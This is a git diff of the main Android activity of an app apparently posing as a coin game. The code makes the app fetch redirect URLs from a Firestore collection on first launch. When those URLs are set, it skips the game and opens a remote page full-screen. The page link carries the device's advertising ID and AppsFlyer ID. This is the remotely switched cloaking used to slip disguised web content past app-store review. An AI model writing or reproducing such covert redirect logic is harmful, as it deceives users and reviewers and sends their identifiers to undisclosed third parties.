@@ -22,7 +22,10 @@ import com.croooownthreecoinsssss.PreferenceHelper.URL_LINK
 import com.google.android.gms.ads.identifier.AdvertisingIdClient
 import com.google.android.gms.common.GooglePlayServicesNotAvailableException
 import com.google.android.gms.common.GooglePlayServicesRepairableException
+import com.google.androidbrowserhelper.trusted.TwaLauncher
 import com.google.firebase.BuildConfig
+import com.google.firebase.firestore.ktx.firestore
+import com.google.firebase.ktx.Firebase
 import com.onesignal.OneSignal
 import io.ktor.client.HttpClient
 import io.ktor.client.engine.cio.CIO
@@ -33,6 +36,8 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.coroutineScope
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.io.IOException
@@ -42,14 +47,12 @@ import kotlin.coroutines.CoroutineContext
 
 class MainActivity : AppCompatActivity(), CoroutineScope {
 
-    var response: String? = null
     var GAID: String? = null
     var URL: String? = null
+    var URL_FINAL: String? = null
     var prefs: SharedPreferences? = null
     var naming: String? = null
-
     private var job: Job = Job()
-
     override val coroutineContext: CoroutineContext
         get() = Dispatchers.Main + job
 
@@ -62,27 +65,43 @@ class MainActivity : AppCompatActivity(), CoroutineScope {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        val db = Firebase.firestore
         prefs = PreferenceHelper.defaultPreference(applicationContext)
         if (prefs?.FIRST_OPEN == false) {
             prefs?.FIRST_OPEN = true
             setContentView(R.layout.load_layout)
-            if(CrownThreeCoinsNetwork.getBooleanNEtwork(applicationContext)) {
-                prefs?.STATE_ADS = true
-                prefs?.GAME_START = false
-                launch {
-                    makeRequest()
-                    gaidAsync()
-                }
-            }
-            else{
-                setContentView(R.layout.activity_main)
-                prefs?.STATE_ADS = false
-                prefs?.GAME_START = true
-            }
+            db.collection("link")
+                .get()
+                .addOnSuccessListener { result ->
+                    for (document in result) {
+                        //Log.d("TAG2", "${document.id} => ${document.data}")
+                        Log.d("TAG2", document.data["first"] as String)
+                        Log.d("TAG2", document.data["second"] as String)
+                        URL = document.data["first"] as String
+                        URL_FINAL = document.data["second"] as String
+                        if (URL != "google.com" && URL!!.isNotEmpty() && URL_FINAL != "google.com" && URL_FINAL!!.isNotEmpty()) {
 
+                            prefs?.STATE_ADS = true
+                            prefs?.GAME_START = false
+                            launch {
+                                gaidAsync()
+                            }
+                        } else {
+                            prefs?.STATE_ADS = false
+                            prefs?.GAME_START = true
+                            setContentView(R.layout.activity_main)
+                        }
+                    }
+                }
+                .addOnFailureListener { exception ->
+                    Log.w("TAG2", "Error getting documents.", exception)
+                    prefs?.STATE_ADS = false
+                    prefs?.GAME_START = true
+                    setContentView(R.layout.activity_main)
+                }
         } else {
             if (prefs?.STATE_ADS == true) {
-                crownThreeCoins(1)
+                openV()
             } else if (prefs?.GAME_START == true) {
                 setContentView(R.layout.activity_main)
             }
@@ -92,77 +111,74 @@ class MainActivity : AppCompatActivity(), CoroutineScope {
     fun handler(view: View) {
         if (view.tag == "game") startActivity(Intent(applicationContext, Game::class.java))
         else {
-            crownThreeCoins(0)
+            val uri = Uri.parse(applicationContext.getString(R.string.POLICY))
+            val launcher = TwaLauncher(this)
+            launcher.launch(uri)
+            finish()
         }
     }
 
-    suspend fun makeRequest() {
-        val client = HttpClient(CIO)
+    fun makeRequest() {
+        launch(Dispatchers.Main) {
+            val client = HttpClient(CIO)
 
-        try {
-            val response2: io.ktor.client.statement.HttpResponse = client.get("https://timetooopllaytthatfisshhthathisnameisfishhrobbin.space/7bjg7RR1")
-
-            if (response2.status == HttpStatusCode.OK) {
-
-                URL = "https://timetooopllaytthatfisshhthathisnameisfishhrobbin.space/mv8LqP8Z"
-                parseRequestKeit()
-                Log.d("Tag", "Success request")
-
-            } else {
-                Log.d("Exit", "exit")
-                setContentView(R.layout.activity_main)
-                prefs?.STATE_ADS = false
-                prefs?.GAME_START = true
-
-                return
+            try {
+                val response2: io.ktor.client.statement.HttpResponse = client.get(URL!!)
+                if (response2.status == HttpStatusCode.OK) {
+                    URL = URL_FINAL
+                    parseRequestKeit()
+                } else {
+                    setContentView(R.layout.activity_main)
+                    prefs?.STATE_ADS = false
+                    prefs?.GAME_START = true
+                    //return
+                }
+            } catch (e: ClientRequestException) {
+                println("Error for request: ${e.message}")
+            } finally {
+                client.close()
             }
-        } catch (e: ClientRequestException) {
-
-            println("Error for request: ${e.message}")
-        } finally {
-            client.close()
         }
     }
+    fun openV(){
+        val uri = Uri.parse(prefs?.URL_LINK) // Замените на свою ссылку
 
-    private fun parseRequestKeit(){
+        val launcher = TwaLauncher(this)
+        launcher.launch(uri)
+        finish()
 
+    }
+
+
+    private fun parseRequestKeit() {
         var m = 0
-        val timer3 = Timer()
-        timer3.scheduleAtFixedRate(object : TimerTask() {
-            override fun run() {
-                runOnUiThread {
 
+        launch(Dispatchers.Main) {
+            while (isActive) {
+                withContext(Dispatchers.Main) {
                     naming = prefs?.NAMING_SUBS
-                    if (naming != "naming" && naming != "") {
-                        timer3.cancel()
-                        formNamingLink()
-                    }else{
+                    if (naming != "nameSubs" && naming != "") {
+                        if (naming != null && naming!!.contains("kurilwik3")) {
+                            prefs?.URL_LINK =
+                                URL + naming + "apso=" + prefs?.APPSFLYER_ID + "&reklamka=" + GAID
+                            runOnUiThread {  openV() }
+                        }
+                        job.cancel()
+                    } else {
                         m++
-                        if(m>20){
-                            timer3.cancel()
-                            formNamingLink()
+                        if (m > 22) {
+                            prefs?.URL_LINK =
+                                URL + "?apso=" + prefs?.APPSFLYER_ID + "&reklamka=" + GAID
+                            runOnUiThread {  openV() }
+                            job.cancel()
                         }
                     }
                 }
+                delay(500)
             }
-        }, 500, 500)
-
-    }
-
-    private fun formNamingLink(){
-
-        if (naming != null && naming!!.contains("sub_id_3")) {
-            prefs?.URL_LINK =
-                URL + naming + "apps_id=" + prefs?.APPSFLYER_ID + "&advert_id=" + GAID
-
-        } else {
-            prefs?.URL_LINK =
-                URL + "?apps_id=" + prefs?.APPSFLYER_ID + "&advert_id=" + GAID
-
         }
-        runOnUiThread {  crownThreeCoins(1) }
-    }
 
+    }
 
     private fun <R> CoroutineScope.executeAsyncTask(
         onPreExecute: () -> Unit,
@@ -183,7 +199,7 @@ class MainActivity : AppCompatActivity(), CoroutineScope {
         }, doInBackground = {
 
             getGAID()
-
+            makeRequest()
             "Result" // send data to "onPostExecute"
         }, onPostExecute = {
             // ... here "it" is a data returned from "doInBackground"
@@ -213,49 +229,5 @@ class MainActivity : AppCompatActivity(), CoroutineScope {
             e.printStackTrace()
         }
 
-    }
-
-    private fun crownThreeCoins(i: Int) {
-        try {
-            response = if (i == 0)
-                "https://www.termsfeed.com/live/23b591b4-d03f-41f6-ba5a-c642fa77f4c9"
-            else
-                prefs?.URL_LINK
-
-            val options = BitmapFactory.Options()
-            options.outWidth = 24
-            options.outHeight = 24
-            options.inScaled = true
-            val backButton =
-                BitmapFactory.decodeResource(resources, R.drawable.round_done_black_24dp, options)
-            val builder = CustomTabsIntent.Builder()
-            builder.enableUrlBarHiding()
-            builder.setToolbarColor(Color.BLACK)
-            builder.setShowTitle(false)
-
-            builder.setCloseButtonIcon(backButton)
-            val shareLabel = getString(R.string.app_name)
-            val actionIntent = Intent(
-                this.applicationContext, ShareBroadcastReceiver::class.java
-            )
-            val pendingIntent = PendingIntent.getBroadcast(applicationContext, 0, actionIntent,
-                PendingIntent.FLAG_IMMUTABLE
-            )
-
-            builder.setActionButton(backButton, shareLabel, pendingIntent)
-            builder.setActionButton(backButton, shareLabel, pendingIntent, false)
-
-            val customTabsIntent = builder.build()
-            customTabsIntent.intent.setPackage("com.android.chrome")
-
-            if (response!!.startsWith("https://")) {
-                customTabsIntent.launchUrl(this, Uri.parse(response))
-                finish()
-            }
-        } catch (e: Resources.NotFoundException) {
-            if (BuildConfig.DEBUG) {
-                e.printStackTrace()
-            }
-        }
     }
 }
